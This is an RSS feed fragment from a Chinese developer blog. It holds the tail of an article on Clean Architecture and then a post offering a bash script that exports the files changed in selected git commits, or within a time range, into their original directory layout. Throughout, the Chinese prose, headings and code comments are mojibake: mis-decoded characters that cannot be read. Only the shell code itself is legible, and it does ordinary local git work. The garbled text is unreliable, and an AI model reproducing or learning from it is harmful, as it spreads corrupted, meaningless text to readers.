<p>ä½†ä¹Ÿä¸æ˜¯æ‰€æœ‰é¡¹ç›®éƒ½è¯¥ç”¨ï¼Œè€Œæ˜¯è¯¥ç”¨æ—¶å¿…é¡»ç”¨ï¼å¯¹äºå¤§å‹ä¸”éœ€æŒç»­è¿­ä»£çš„é¡¹ç›®ï¼Œæ¶æ„æ²»ç†æ˜¯å¿…ç„¶è¦æ±‚ï¼Œéšç€ä»£ç é‡å¢åŠ ï¼Œæ”¹åŠ¨æˆæœ¬ä¸æ–­ä¸Šå‡ï¼Œæ‰€ä»¥æ¯”è¾ƒé€‚ç”¨äº â€œä¸­å¤§å‹â€ï¼Œâ€œå›¢é˜Ÿåä½œâ€ï¼Œâ€œé«˜å¯é æ€§è¦æ±‚â€ çš„é¡¹ç›®ã€‚å¦‚æœä½ çš„é¡¹ç›®æœ¬èº«è§„æ¨¡ä¸å¤§ï¼Œä¹Ÿä¸éœ€è¦èŠ±é¢å¤–ç²¾åŠ›æ²»ç†æ¶æ„ï¼Œå¯¹äºå°è§„æ¨¡é¡¹ç›®ï¼Œå¼•å…¥ Clean Architecture å¯èƒ½ä¼šå¢åŠ å¼€å‘æˆæœ¬ï¼Œæ‰€ä»¥ä¸é€‚ç”¨ã€‚</p>
<blockquote>
<p>æ¶æ„ä¸æ˜¯ç‚«æŠ€ï¼Œè€Œæ˜¯ä¸ºæœªæ¥çš„è‡ªå·±å’Œå›¢é˜Ÿå‡è´Ÿï¼Œæˆ‘ä»¬ä¸èƒ½ â€œä¸ºäº†æ¶æ„è€Œæ¶æ„â€ï¼Œè‹¥é¡¹ç›®æ³¨å®š â€œä¸€æ¬¡æ€§â€ï¼Œè¯·å¤§èƒ†ç®€åŒ–ï¼Œæ•ˆç‡ä¼˜å…ˆï¼Œè‹¥é¡¹ç›®éœ€ â€œæ´»ä¸‹å»ã€é•¿å‡ºæ¥â€ï¼Œå°±å¾—æ¥å—çŸ­æœŸæˆæœ¬ï¼ŒæŠ•èµ„é•¿æœŸå¥åº·ã€‚Clean Architecture çš„ç²¾é«“å°±åœ¨äºå®ƒä¸æ‰¿è¯º â€œå†™å¾—æ›´å¿«â€ï¼Œä½†æ‰¿è¯º â€œæ”¹å¾—æ›´ç¨³â€ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¯¼å‡º git æäº¤è®°å½•çš„æ–‡ä»¶]]></title>    <link>https://juejin.cn/post/7602929352717369344</link>    <guid>https://juejin.cn/post/7602929352717369344</guid>    <pubDate>2026-02-05T08:54:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602929352717369344" data-draft-id="7602991346585092130" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¯¼å‡º git æäº¤è®°å½•çš„æ–‡ä»¶"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-05T08:54:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="jokerä¸¶ç‰§ç¾Šäºº"/> <meta itemprop="url" content="https://juejin.cn/user/4054654614250958"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¯¼å‡º git æäº¤è®°å½•çš„æ–‡ä»¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4054654614250958/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    jokerä¸¶ç‰§ç¾Šäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T08:54:24.000Z" title="Thu Feb 05 2026 08:54:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">å‰è¨€</h3>
<blockquote>
<p>ä¸ºäº†æ–¹ä¾¿åœ¨çº¿ä¸Šç›´æ¥è¦†ç›–æ›´æ–°ï¼Œè€Œä¸ç”¨å•ä¸ªæ–‡ä»¶è¦†ç›–ï¼Œä»è€Œå‡å°‘æ›´æ–°é”™è¯¯ç‡ï¼Œæå‡æ›´æ–°æ•ˆç‡ã€‚</p>
<p>æ¯æ¬¡å‘ç‰ˆæ›´æ–°å‰ï¼Œéƒ½è¦æ•´ç†æœ€è¿‘ä¿®æ”¹çš„æ–‡ä»¶ï¼Œå¹¶æŒ‰ç…§æ–‡ä»¶åŸæœ‰ç›®å½•ç»“æ„æ”¾ç½®ã€‚</p>
<p>å½“æäº¤æ¬¡æ•°å¤šäº†åï¼Œæ“ä½œèµ·æ¥å°±éå¸¸çš„éº»çƒ¦ï¼›ä¸ºæ­¤ï¼Œå°±æƒ³ä½¿ç”¨è„šæœ¬ä¸€æ¬¡æ€§å¤„ç†è¯¥éœ€æ±‚ã€‚</p>
<p>ä»è€Œè¯ç”Ÿäº†è¿™ä¸ªè„šæœ¬ã€‚</p>
</blockquote>
<h3 data-id="heading-1">åŠŸèƒ½è¯´æ˜</h3>
<blockquote>
<p>å¯¼å‡º git æäº¤è®°å½•æ–‡ä»¶ï¼Œå¹¶æŒ‰ç…§æ–‡ä»¶åŸæœ‰ç›®å½•ç»“æ„æ”¾ç½®</p>
</blockquote>
<h3 data-id="heading-2">å¦‚ä½•ä½¿ç”¨</h3>
<ul>
<li>
<p>ä¿®æ”¹é¡¹ç›®ç›®å½•å…¬å…±å‰ç¼€ <code>PROJECT_PATH_PREFIX</code></p>
</li>
<li>
<p>ä¿®æ”¹å¯¼å‡ºç›®å½•å…¬å…±å‰ç¼€ <code>EXPORT_BASE</code></p>
</li>
<li>
<p>ä¿®æ”¹é¡¹ç›®é…ç½®ä¿¡æ¯ï¼Œå¯å¤šé¡¹ç›®å…±å­˜</p>
<blockquote>
<p>å…·ä½“ä¿¡æ¯è¯·æŸ¥çœ‹è„šæœ¬æ–‡ä»¶ä¸­çš„æ³¨é‡Šè¯´æ˜</p>
</blockquote>
<pre><code class="hljs language-shell" lang="shell">project "
    name='é¡¹ç›®A'
    path='projectA'
    commit_ids='fa5b485e0508ee0c054496d4c5822777ead86503 9232dcbaec77abbec5a0806692a50e36a162b57e'
<span class="hljs-meta prompt_"># </span><span class="bash">   start_time=<span class="hljs-string">'2023-10-01 09:00'</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash">   end_time=<span class="hljs-string">'2023-10-15 18:00'</span></span>
"

project "
    name='é¡¹ç›®B'
    path='projectB'
    commit_ids=''
    start_time='2026-02-01 09:00'
    end_time=''
"
<span class="hljs-meta prompt_">
# </span><span class="bash">ç¤ºä¾‹ï¼šç»å¯¹è·¯å¾„ä¸”åªç”¨ start_time</span>
<span class="hljs-meta prompt_"># </span><span class="bash">project <span class="hljs-string">"</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-string">    name='å¤–éƒ¨é¡¹ç›®'</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-string">    path='/e/work/other-repo'</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-string">    start_time='yesterday'</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-string">"</span></span>
</code></pre>
</li>
<li>
<p>ä¿å­˜ï¼Œæ·»åŠ æ–‡ä»¶æ‰§è¡Œæƒé™</p>
</li>
<li>
<p>æ‰§è¡Œæ–‡ä»¶</p>
</li>
</ul>
<h3 data-id="heading-3">è„šæœ¬å†…å®¹</h3>
<blockquote>
<p>å¯ç›´æ¥ä½¿ç”¨</p>
</blockquote>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">#</span><span class="bash">!/usr/bin/env bash</span>
set -e
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment">#################################################</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash">ä¸€ã€å…¨å±€é…ç½®</span>
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment">#################################################</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash">é»˜è®¤ä»“åº“æ ¹ç›®å½•ï¼ˆWindows ç¯å¢ƒç¤ºä¾‹ï¼‰</span>
PROJECT_PATH_PREFIX="/d/www"
<span class="hljs-meta prompt_"># </span><span class="bash">å¯¼å‡ºç›®æ ‡æ ¹ç›®å½•</span>
EXPORT_BASE="/d/www/export-git-commit"
<span class="hljs-meta prompt_"># </span><span class="bash">æœ¬æ¬¡å¯¼å‡ºçš„æ—¶é—´æˆ³æ–‡ä»¶å¤¹</span>
EXPORT_TIME=$(date +"%Y%m%d_%H%M%S")
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment">#################################################</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash">äºŒã€æ ¸å¿ƒé€»è¾‘å¼•æ“</span>
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment">#################################################</span></span>

project() {
    # åœ¨å­ Shell ä¸­è¿è¡Œï¼Œç¡®ä¿å˜é‡éš”ç¦»
    (
        # åˆå§‹åŒ–å±€éƒ¨å˜é‡ï¼Œé˜²æ­¢è¯»å–åˆ°ä¸Šä¸€ä¸ªé¡¹ç›®çš„é…ç½®
        local name=""
        local path=""
        local commit_ids=""
        local start_time=""
        local end_time=""

        # ã€æ ¸å¿ƒä¿®æ­£ã€‘è§£æä¼ å…¥çš„é…ç½®å­—ç¬¦ä¸²
        eval "$1"

        # 1. åŸºç¡€æ ¡éªŒ
        if [[ -z "$name" || -z "$path" ]]; then
            echo -e "\033[31mâŒ é…ç½®é”™è¯¯: name æˆ– path ä¸èƒ½ä¸ºç©º\033[0m"
            return
        fi

        # 2. è·¯å¾„æ‹¼æ¥é€»è¾‘
        local REPO_PATH
        if [[ "$path" == /* ]]; then
            REPO_PATH="$path"
        else
            REPO_PATH="${PROJECT_PATH_PREFIX%/}/$path"
        fi

        echo -e "\n\033[32m========================================\033[0m"
        echo "ğŸ“¦ é¡¹ç›®: $name"
        echo "ğŸ“ ä»“åº“: $REPO_PATH"

        if [ ! -d "$REPO_PATH/.git" ]; then
            echo "âŒ ä»“åº“è·¯å¾„ä¸å­˜åœ¨ï¼Œå·²è·³è¿‡"
            return
        fi
        cd "$REPO_PATH"

        # 3. ç¡®å®š Commit èŒƒå›´ (ä¼˜å…ˆçº§: æ—¶é—´ &gt; Commit IDs)
        local FINAL_COMMITS=""
        if [[ -n "$start_time" ]]; then
            echo "ğŸ•’ æ¨¡å¼: æ—¶é—´åŒºé—´ [$start_time] -&gt; [${end_time:-è‡³ä»Š}]"
            local LOG_CMD="git log --reverse --format=%H --since=\"$start_time\""
            [[ -n "$end_time" ]] &amp;&amp; LOG_CMD="$LOG_CMD --until=\"$end_time\""
            FINAL_COMMITS=$(eval "$LOG_CMD")
        elif [[ -n "$commit_ids" ]]; then
            echo "ğŸ”– æ¨¡å¼: æŒ‡å®š Commit IDs"
            # è‡ªåŠ¨æŒ‰æäº¤æ—¶é—´æ’åº
            FINAL_COMMITS=$(for C in $commit_ids; do
                local TS=$(git show -s --format=%ct "$C" 2&gt;/dev/null || true)
                [[ -n "$TS" ]] &amp;&amp; echo "$TS $C"
            done | sort -n | awk '{print $2}')
        fi

        if [[ -z "$FINAL_COMMITS" ]]; then
            echo "âš ï¸ æœªæ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„æäº¤ï¼Œè·³è¿‡"
            return
        fi

        # 4. è¿½è¸ªæ–‡ä»¶æœ€ç»ˆçŠ¶æ€ (ä½¿ç”¨å…³è”æ•°ç»„ï¼ŒBash 4.0+)
        declare -A FILE_STATE
        for COMMIT in $FINAL_COMMITS; do
            while read -r STATUS FILE; do
                if [[ "$STATUS" == "D" ]]; then
                    unset FILE_STATE["$FILE"]
                else
                    FILE_STATE["$FILE"]="$COMMIT"
                fi
            done &lt; &lt;(git diff-tree --no-commit-id --name-status -r "$COMMIT")
        done

        # 5. æ‰§è¡Œå¯¼å‡º
        local FILE_COUNT=${#FILE_STATE[@]}
        if [[ $FILE_COUNT -eq 0 ]]; then
            echo "ğŸ“­ æ— æ–‡ä»¶éœ€è¦å¯¼å‡º"
            return
        fi

        local OUT_ROOT="$EXPORT_BASE/$name/$EXPORT_TIME"
        mkdir -p "$OUT_ROOT"

        # è®°å½•å¯¼å‡ºæ¸…å•
        local SUMMARY="$OUT_ROOT/export-summary.txt"
        {
            echo "é¡¹ç›®: $name"
            echo "å¯¼å‡ºæ—¶é—´: $EXPORT_TIME"
            echo "æäº¤èŒƒå›´: $(echo $FINAL_COMMITS | tr '\n' ' ')"
            echo "--------------------------------"
        } &gt; "$SUMMARY"

        for F in "${!FILE_STATE[@]}"; do
            local TARGET="$OUT_ROOT/$F"
            mkdir -p "$(dirname "$TARGET")"
            # ä»å¯¹åº”çš„ commit ä¸­æå–æ–‡ä»¶
            git show "${FILE_STATE[$F]}:$F" &gt; "$TARGET"
            echo "âœ” $F (æ¥è‡ª ${FILE_STATE[$F]:0:7})" &gt;&gt; "$SUMMARY"
        done

        echo "âœ… æˆåŠŸå¯¼å‡º $FILE_COUNT ä¸ªæ–‡ä»¶"
        echo "ğŸ“‚ å¯¼å‡ºè‡³: $OUT_ROOT"
    )
}
<span class="hljs-meta prompt_">
#</span><span class="bash"><span class="hljs-comment">#################################################</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash">ä¸‰-1ã€é¡¹ç›®é…ç½®åŒºï¼ˆKey-Value æ¨¡å¼ï¼‰</span>
<span class="hljs-meta prompt_">#</span><span class="bash"><span class="hljs-comment">#################################################</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash">æ³¨æ„ï¼šé…ç½®å¿…é¡»åŒ…è£¹åœ¨åŒå¼•å· <span class="hljs-string">""</span> å†…</span>

project "
    name='é¡¹ç›®A'
    path='projectA'
    commit_ids='fa5b485e0508ee0c054496d4c5822777ead86503 9232dcbaec77abbec5a0806692a50e36a162b57e'
<span class="hljs-meta prompt_"># </span><span class="bash">   start_time=<span class="hljs-string">'2023-10-01 09:00'</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash">   end_time=<span class="hljs-string">'2023-10-15 18:00'</span></span>
"

project "
    name='é¡¹ç›®B'
    path='projectB'
    commit_ids=''
    start_time='2026-02-01 09:00'
    end_time=''
"
<span class="hljs-meta prompt_">
# </span><span class="bash">ç¤ºä¾‹ï¼šç»å¯¹è·¯å¾„ä¸”åªç”¨ start_time</span>
<span class="hljs-meta prompt_"># </span><span class="bash">project <span class="hljs-string">"</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-string">    name='å¤–éƒ¨é¡¹ç›®'</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-string">    path='/e/work/other-repo'</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-string">    start_time='yesterday'</span></span>
<span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-string">"</span></span>

echo -e "\n\033[36mâœ¨ æ‰€æœ‰å¯¼å‡ºä»»åŠ¡å¤„ç†å®Œæ¯•ï¼\033[0m"
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>